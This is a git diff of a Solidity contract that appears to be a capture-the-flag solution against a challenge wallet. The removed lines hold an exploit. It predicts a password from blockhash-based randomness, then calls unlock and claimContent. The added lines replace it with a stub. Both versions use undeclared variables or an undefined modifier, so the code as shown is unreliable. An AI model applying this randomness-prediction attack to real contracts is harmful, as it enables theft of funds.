@@ -5,34 +5,18 @@ import "./Campaign2.sol";
 
 
 contract Contract{
-        address public YOUR_CHALLENGE_CONTRACT_ADDRESS = address(0x7eb0803195b4686A8cADFdA14121E286Bde6a76A);
+	address public YOUR_CHALLENGE_CONTRACT_ADDRESS = address(0x7eb0803195b4686A8cADFdA14121E286Bde6a76A);
 
-        CouncilWallet public creature = Vault(YOUR_CHALLENGE_CONTRACT_ADDRESS);
+	CouncilWallet public creature = CouncilWallet(YOUR_CHALLENGE_CONTRACT_ADDRESS);
 
-	constructor() {
+	function attack2() public review returns (address[] memory){
+		address[] memory councilMembers = new address[](11);
+		for (uint256 i = 0; i < 11; i++) {
+			councilMembers[i] = address(uint160(i));
+		}
+
+		return councilMembers;
 	}
-
-        function attack2() external {
-                passphrase = bytes32(keccak256(abi.encodePacked(uint256(blockhash(block.timestamp)))));
-
-                uint128 _secretKey = uint128(bytes16(_magicPassword()) >> 64);
-                _password = bytes16( (uint128(uint64(uint160(owner))) << 64) | _secretKey );
-
-                creature.unlock(_password);
-                creature.claimContent();
-        }
-
-        function _generateKey(uint256 _reductor) private returns (uint256 ret) {
-                ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
-                nonce++;
-        }
-
-        function _magicPassword() private returns (bytes8) {
-                uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
-                uint128 _key2 = uint128(_generateKey(2));
-                bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
-                return (_secret >> 32 | _secret << 16);
-        }
 
 }
 
